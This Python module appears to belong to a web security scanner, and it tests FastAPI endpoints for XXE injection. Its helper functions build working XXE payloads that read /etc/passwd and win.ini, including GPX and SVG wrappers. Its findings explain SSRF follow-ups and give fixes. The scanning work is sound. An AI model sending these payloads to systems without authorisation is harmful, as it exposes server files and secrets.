"""A03 — XML External Entity (XXE) injection.

FastAPI is JSON-first, so XXE only applies where an endpoint actually parses XML:
an ``application/xml`` / ``text/xml`` / SOAP body, or a file upload of an
XML-family format (GPX, SVG, KML, RSS/Atom, DOCX-ish). Where that happens, a
parser configured to resolve external entities will read local files (or make
SSRF/OAST callbacks) on the attacker's behalf.

  1. Discovery: routes declaring an XML request content-type, plus multipart
     uploads whose path/field name hints an XML format (gpx/xml/svg/kml/…).
  2. Probing (FULL mode): submit a document with a ``SYSTEM "file:///etc/passwd"``
     (and Windows ``win.ini``) external entity referenced from the body. If the
     file's contents come back in the response, it's an in-band XXE — HIGH,
     confirmed. For upload routes the entity is wrapped in a format-appropriate
     skeleton so the parser reaches it.

A hardened parser (Python's ``defusedxml``, or ``lxml`` with
``resolve_entities=False``) refuses the entity and the probe reads SAFE. Blind
XXE with no in-band reflection needs an OAST callback to confirm — we flag those
sinks as "verify with OAST" rather than guess.
"""

from __future__ import annotations

import re

import requests

from ..core.context import Context
from ..core.taxonomy import REFS
from .base import module

# Markers proving a well-known local file was read back in-band. The passwd
# matcher is STRUCTURAL — a full account line `name:pw:uid:gid:gecos:home:` —
# rather than a loose `/bin/bash` / `daemon:` substring, which false-positived on
# any response echoing a shell path (env dumps, verbose stack traces). It also
# catches leaks where the visible line isn't root (www-data/daemon only).
_PASSWD_LINE = re.compile(r"(?m)^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:[^:]*:[^:]*:")
_WININI = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)

_XML_CTS = ("application/xml", "text/xml", "application/soap+xml",
            "application/xhtml+xml")
_XML_HINTS = ("gpx", "xml", "svg", "kml", "kmz", "rss", "atom", "feed", "soap",
              "wsdl", "xsd", "docx", "sitemap")
_MAX_TARGETS = 14


def _passwd_doc(root: str = "root", field: str = None) -> bytes:
    inner = "&xxe;"
    body = f"<{field}>{inner}</{field}>" if field else inner
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE {root} [\n'
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        ']>\n'
        f'<{root}>{body}</{root}>'
    ).encode()


def _winini_doc(root: str = "root") -> bytes:
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
        f'<{root}>&xxe;</{root}>'
    ).encode()


def _gpx_doc() -> bytes:
    # GPX skeleton so a GPX parser reaches the entity in <name>.
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<gpx version="1.1"><wpt lat="0" lon="0"><name>&xxe;</name></wpt></gpx>'
    ).encode()


def _svg_doc() -> bytes:
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    ).encode()


@module("xxe", "XML External Entity (XXE)", destructive=True)
def run(ctx: Context) -> None:
    token = _actor_token(ctx)
    xml_bodies, xml_uploads = _discover(ctx)
    if not (xml_bodies or xml_uploads):
        ctx.note("xxe: no XML-parsing endpoints (body or upload) in the surface")
        return
    if ctx.safe:
        ctx.note(f"xxe: {len(xml_bodies) + len(xml_uploads)} XML sink(s) found — "
                 "skipped (writes; FULL mode only)")
        return

    confirmed: list[dict] = []
    accepted: list[dict] = []
    probed = 0
    for route in xml_bodies[:_MAX_TARGETS]:
        probed += 1
        _probe_body(ctx, route, token, confirmed, accepted)
    for route, field, fmt in xml_uploads[:_MAX_TARGETS]:
        probed += 1
        _probe_upload(ctx, route, field, fmt, token, confirmed, accepted)

    ctx.note(f"xxe: probed {probed} XML sink(s); {len(confirmed)} leaked a local "
             f"file, {len(accepted)} parsed our XML without leaking")
    if confirmed:
        _report_confirmed(ctx, confirmed)
    elif accepted:
        _report_potential(ctx, accepted)
    elif probed:
        _report_safe(ctx, probed)


def _actor_token(ctx: Context) -> str | None:
    princ = ctx.principal("attacker", "user") or ctx.principal("admin")
    return princ.token if princ and princ.authed else None


# ── discovery ────────────────────────────────────────────────────────────────

def _discover(ctx: Context):
    xml_bodies, xml_uploads = [], []
    for r in ctx.routes:
        if r.method not in ("POST", "PUT", "PATCH"):
            continue
        content = (r.raw.get("requestBody", {}) or {}).get("content", {})
        if any(ct in content for ct in _XML_CTS):
            xml_bodies.append(r)
            continue
        if "multipart/form-data" in content:
            props = (r.body_schema or {}).get("properties", {}) or {}
            file_field = next((n for n, s in props.items()
                               if isinstance(s, dict) and s.get("format") == "binary"),
                              None) or next((n for n in ("file", "upload", "gpx")
                                             if n in props), None)
            fmt = _xml_format(r, list(props))
            if file_field and fmt:
                xml_uploads.append((r, file_field, fmt))
    return xml_bodies, xml_uploads


def _xml_format(route, prop_names) -> str | None:
    hay = (route.path + " " + route.operation_id + " " + " ".join(prop_names)).lower()
    for h in _XML_HINTS:
        if h in hay:
            return h
    return None


# ── probing ──────────────────────────────────────────────────────────────────

def _leaked(resp) -> str | None:
    try:
        body = resp.text or ""
    except Exception:  # pragma: no cover - defensive
        return None
    m = _PASSWD_LINE.search(body)
    if m:
        return f"/etc/passwd account line reflected: …{body[m.start():m.start() + 60]}…"
    if _WININI.search(body):
        return "C:\\windows\\win.ini contents reflected"
    return None


def _probe_body(ctx, route, token, confirmed, accepted):
    path = route.fill_path({p: "1" for p in route.path_params})
    root = ((route.body_schema or {}).get("xml") or {}).get("name") or "root"
    any_parsed = False
    for doc in (_passwd_doc(root), _winini_doc(root)):
        try:
            resp = ctx.request(route.method, path, token=token, data=doc,
                               headers={"Content-Type": "application/xml"},
                               timeout=12, retry_429=False)
        except requests.RequestException:
            continue
        leak = _leaked(resp)
        if leak:
            confirmed.append({"route": route, "how": "xml body", "leak": leak})
            return
        if resp.status_code < 400:
            any_parsed = True
    if any_parsed:
        accepted.append({"route": route, "how": "xml body"})


def _probe_upload(ctx, route, field, fmt, token, confirmed, accepted):
    path = route.fill_path({p: "1" for p in route.path_params})
    if fmt == "gpx":
        doc, fn, ct = _gpx_doc(), "heimdall.gpx", "application/gpx+xml"
    elif fmt == "svg":
        doc, fn, ct = _svg_doc(), "heimdall.svg", "image/svg+xml"
    else:
        doc, fn, ct = _passwd_doc(), f"heimdall.{fmt}", "application/xml"
    props = (route.body_schema or {}).get("properties", {}) or {}
    data = {n: "heimdall" for n in props if n != field}
    try:
        resp = ctx.request(route.method, path, token=token,
                           files={field: (fn, doc, ct)}, data=data,
                           timeout=15, retry_429=False)
    except requests.RequestException:
        return
    leak = _leaked(resp)
    if leak:
        confirmed.append({"route": route, "how": f"{fmt} upload", "leak": leak})
    elif resp.status_code < 400:
        accepted.append({"route": route, "how": f"{fmt} upload"})


# ── findings ─────────────────────────────────────────────────────────────────

def _report_confirmed(ctx, confirmed):
    lead = confirmed[0]
    r = lead["route"]
    lines = [f"  {c['route'].method} {c['route'].path}  ({c['how']}) -> {c['leak']}"
             for c in confirmed[:15]]
    ctx.finding(
        id="a03-xxe",
        owasp="A03", severity="HIGH",
        title=(f"XXE (external entity file read) via {lead['how']} on "
               f"{r.method} {r.path}"
               + (f" (+{len(confirmed) - 1} more)" if len(confirmed) > 1 else "")),
        summary=(
            "An XML parser resolved an attacker-defined external entity: a "
            "`SYSTEM \"file:///etc/passwd\"` entity referenced from the submitted "
            "document was expanded and its contents came back in the response. An "
            "attacker can read arbitrary server-side files (configs, keys, "
            "secrets), and the same primitive typically enables SSRF (entity "
            "pointed at an internal URL or the cloud metadata service) and "
            "entity-expansion DoS. Disable external-entity/DTD processing: parse "
            "with defusedxml, or lxml with resolve_entities=False + no_network."
        ),
        evidence="\n".join(lines),
        route=f"{r.method} {r.path}",
        request=f"{r.method} {r.path}  ({lead['how']}, external entity → file:///etc/passwd)",
        reproduction=(
            f"Submit to {r.method} {r.path} an XML document declaring "
            "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> and "
            "referencing &xxe; in an element; the response includes /etc/passwd. "
            "Then repoint the entity at an internal URL / a Collaborator host to "
            "demonstrate SSRF."
        ),
        references=[REFS["A03"],
                    "https://portswigger.net/web-security/xxe",
                    "https://cheatsheetseries.owasp.org/cheatsheets/"
                    "XML_External_Entity_Prevention_Cheat_Sheet.html"],
        tools=["Burp Suite (Collaborator)", "curl", "XXEinjector"],
    )


def _report_potential(ctx, accepted):
    lead = accepted[0]
    r = lead["route"]
    lines = [f"  {c['route'].method} {c['route'].path}  ({c['how']})"
             for c in accepted[:15]]
    ctx.finding(
        id="a03-xxe-potential",
        owasp="A03", severity="LOW",
        title=f"{len(accepted)} XML-parsing endpoint(s) — verify XXE with OAST",
        summary=(
            "These endpoints parsed a submitted XML document (no local-file "
            "contents were reflected in-band, so no confirmed read). Blind XXE "
            "leaves no in-band evidence: an external entity can still fire an "
            "outbound DNS/HTTP request the response never shows. Confirm each with "
            "an OAST/Collaborator external-entity payload, and verify the parser "
            "disables DTDs/external entities (defusedxml / resolve_entities=False)."
        ),
        evidence="\n".join(lines),
        route=f"{r.method} {r.path}",
        references=[REFS["A03"],
                    "https://portswigger.net/web-security/xxe/blind"],
        tools=["Burp Suite (Collaborator)", "interactsh"],
    )


def _report_safe(ctx, probed):
    ctx.finding(
        id="a03-xxe-safe",
        owasp="A03", severity="SAFE",
        title="XML parsers refused external entities",
        summary=(
            f"Submitted external-entity (file:///etc/passwd, win.ini) documents to "
            f"{probed} XML sink(s); none reflected local-file contents and the "
            "payloads were rejected or parsed without entity expansion, consistent "
            "with a hardened parser (defusedxml / external entities disabled). "
            "Blind XXE can't be fully excluded black-box — confirm residual sinks "
            "with an OAST callback."
        ),
        references=[REFS["A03"], "https://portswigger.net/web-security/xxe"],
    )
